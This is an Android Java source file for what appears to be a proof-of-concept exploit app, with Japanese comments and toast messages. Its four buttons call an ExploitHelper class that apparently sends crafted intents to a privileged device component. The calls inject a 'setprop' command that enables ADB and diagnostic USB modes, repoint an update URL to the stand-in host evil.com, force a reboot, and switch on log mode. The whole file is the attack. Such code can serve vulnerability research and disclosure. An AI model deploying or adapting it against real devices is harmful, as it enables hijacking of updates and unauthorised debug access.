package com.poc;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnExec = findViewById(R.id.btn_exec);
        Button btnSetProp = findViewById(R.id.btn_setprop);
        Button btnReboot = findViewById(R.id.btn_reboot);
        Button btnChangeUrl = findViewById(R.id.btn_change_url);

        btnExec.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ExploitHelper.sendStartUpdateUE(MainActivity.this,
                        "dummy", "setprop sys.usb.config rndis,diag,modem,none,adb");
                Toast.makeText(MainActivity.this, "ACTION_START_UPDATEUE 送信", Toast.LENGTH_SHORT).show();
            }
        });

        btnSetProp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ExploitHelper.sendValueSet(MainActivity.this, 1, "http://evil.com/update");
                Toast.makeText(MainActivity.this, "ACTION_VALUE_SET 送信 (URL変更)", Toast.LENGTH_SHORT).show();
            }
        });

        btnReboot.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ExploitHelper.sendUeCommandReboot(MainActivity.this, "/data/total");
                Toast.makeText(MainActivity.this, "UECOMMAND_REBOOT 送信", Toast.LENGTH_SHORT).show();
            }
        });

        btnChangeUrl.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ExploitHelper.sendValueSet(MainActivity.this, 4, "1"); // ログモード強制有効化
                Toast.makeText(MainActivity.this, "ACTION_VALUE_SET (LOG_MODE=1) 送信", Toast.LENGTH_SHORT).show();
            }
        });
    }
}
